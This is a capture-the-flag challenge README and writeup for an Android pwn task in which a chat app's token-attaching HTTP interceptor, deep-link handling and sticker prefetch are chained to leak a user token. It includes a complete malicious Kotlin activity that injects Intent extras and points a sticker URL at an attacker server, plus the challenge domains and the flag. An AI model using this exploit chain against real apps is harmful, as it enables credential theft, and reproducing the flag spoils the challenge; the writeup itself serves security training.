# pwn | Blackmail

## Information
> Welcome to Super App Store, where anyone can publish their apps!

Yeah, what a bunch of baloney. My app passed the review process a month ago! And I still haven't heard from them. Maybe this *admin* guy only lets his friends publish here?

Well, that's no matter now. I've decided I'm blackmailing him. 

You're gonna help me with that. Here's the [storefront](https://superappstore-dc-b5d4cf625464c878.brics-ctf.ru/). He uses that stupid *DroidChat* app he made himself. I know he must be keeping some secrets there...

## Public
App build is distributed on the storefront.

## Deploy
Deploy `dev/app-backend` to a normal machine.

Deploy `dev/runner` (front) to a normal machine.

Deploy `dev/runner` (runner) to a KVM-capable machine.
- Install Android SDK, particularly system image that you wish to use (to `~/Android/sdk`). Note that `google_apis_playstore` does not have root access, so you'll want those ones.
- Point `DB_URI` to front machine. Multiple runners are not supported.

## Writeup
Reversing the Android app, we should pay attention to following:

1. The app has an `okhttp.Interceptor` which attaches the user token as a query parameter to HTTPS requests to the API host. The check it performs, however, is faulty:
```java
public final class d implements s {
    // ...
    public final a0 a(f fVar) {
        // ...
        if (j.N1(((r) wVar.f655b).f5334h, "https://droidchat-ab2f2aaa594034df.brics-ctf.ru", false)) {
            q f7 = ((r) wVar.f655b).f();
            String string = this.f2431a.f1797a.getString("token", null);
```
This is what Koltin turns `Strings.startsWith` into. Obviously, a slash is missing at the end, so a URL like `https://droidchat-...-ctf.ru@hacker.com` would pass the check.

2. DeepLinkActivity does not create a new Intent, instead modifying the received one. This allows us to sneak extras into ListActivity and ChatActvity.

3. ChatActivityArguments processes the Intent's extras with the following logic:
   - If int extra `dl.chat.uid` is present, try to open chat with this user ID.
   - If that failed, look at `args` bundle extra. If `ChatActivityArguments.pendingSticker` is present, send the sticker first. Then open the chat with given user.

4. When a 'sticker' button is pressed in ListActivity, ChatActivity is started with a `ChatActivityArguments.pendingSticker`. Looking at the UI, we can notice that the image is loaded before actually sending the message. And, in fact, no check is performed that `pendingSticker` is valid. This means that, if we could alter `pendingSticker`, we could make abritrary GET requests (note that HTTPS is required).

5. Looking at ListActivity, notice the unorthodox serialization of ChatActivityArguments into the Intent:
```java
Intent intent = new Intent(listActivity2, ChatActivity.class);
User user2 = mVar2.f4045a;
y1.g.B(user2, "user");
Bundle bundle2 = new Bundle();
Bundle bundle3 = new Bundle();
bundle3.putInt("_User__id", user2.f6293a);
bundle3.putString("_User__username", user2.f6294b);
bundle2.putBundle("_ChatActivityArguments__user", bundle3);
Bundle bundle4 = new Bundle();
bundle4.putString("_Sticker__id", sticker.f6289a);
bundle4.putString("_Sticker__url", sticker.f6290b);
bundle2.putBundle("_ChatActivityArguments__pendingSticker", bundle4);
intent.putExtra("args", bundle2);
listActivity2.startActivity(intent);
```
We can easily craft this data in our malicious app and deliver it via a deep link Intent.

Taking all of this into account, here is the MainActivity of our malicious app:

```kotlin
package ru.superappstore.newapp

import android.content.Intent
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        startActivity(Intent().apply {
            data = Uri.parse("droidchat://chat/-1234")
            putExtra("args", Bundle().apply {
                putBundle("_ChatActivityArguments__user", Bundle().apply {
                    putInt("_User__id", 11)
                    putString("_User__username", "get pwned")
                })
                putBundle("_ChatActivityArguments__pendingSticker", Bundle().apply {
                    putString("_Sticker__id", "owo")
                    putString("_Sticker__url", "https://droidchat-ab2f2aaa594034df.brics-ctf.ru@<YOUR_SERVER_HERE!>/")
                })
            })
        })
    }
}

```

When DroidChat starts with this Intent, `dl.chat.uid` is set to `-1234`, a nonexistent ID. ChatActivity thus fails to load the linked chat. It then tries to process ChatActivityArguments, and leaks the user token while trying to prefetch the sticker image.

## Domains
- `droidchat-ab2f2aaa594034df.task.brics-ctf.ru` -- app backend

- `superappstore-dc-b5d4cf625464c878.task.brics-ctf.ru` -- exploit submitter

## Cloudflare
Backend --  *No*, Submitter -- *Yes*

## Flag
`brics+{st4t3_y0ur_1nt3n7_075a84e6069f}`

